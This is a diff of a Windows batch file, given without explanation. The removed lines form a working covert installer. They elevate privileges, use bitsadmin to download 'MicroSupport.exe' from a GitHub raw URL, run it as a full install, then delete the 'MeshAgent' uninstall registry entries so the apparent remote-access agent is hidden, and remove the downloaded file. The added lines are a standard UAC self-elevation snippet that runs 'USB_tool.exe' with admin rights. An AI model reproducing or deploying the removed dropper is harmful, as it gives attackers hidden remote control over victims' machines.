@@ -1,19 +1,27 @@
-ÿþ&cls
 @echo off
-setlocal enabledelayedexpansion
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
-    exit /b
-)
-set EXE_URL=https://raw.githubusercontent.com/PixelUpdates/wget/refs/heads/main/MicroSupport.exe
-set EXE_FILE=%TEMP%\microsupport.exe
-set INSTALL_PATH="C:\Program Files\MicroSupport"
-bitsadmin /transfer "MicroSupportUpdate" %EXE_URL% %EXE_FILE% >nul 2>&1
-if not exist "%EXE_FILE%" (
-    exit /b 1
-)
-"%EXE_FILE%" -fullinstall --installPath=%INSTALL_PATH%
-for /f "tokens=*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "MeshAgent" ^| findstr /i "HKEY_LOCAL_MACHINE"') do reg delete "%%a" /f >nul 2>&1
-for /f "tokens=*" %%a in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "MeshAgent" ^| findstr /i "HKEY_LOCAL_MACHINE"') do reg delete "%%a" /f >nul 2>&1
-del "%EXE_FILE%" >nul 2>&1
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+    "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
+    pushd "%CD%"
+    CD /D "C:\Users\"
+    
+    echo Running USB_tool.exe with admin privileges...
+    USB_tool.exe all -f
+    
+    pause
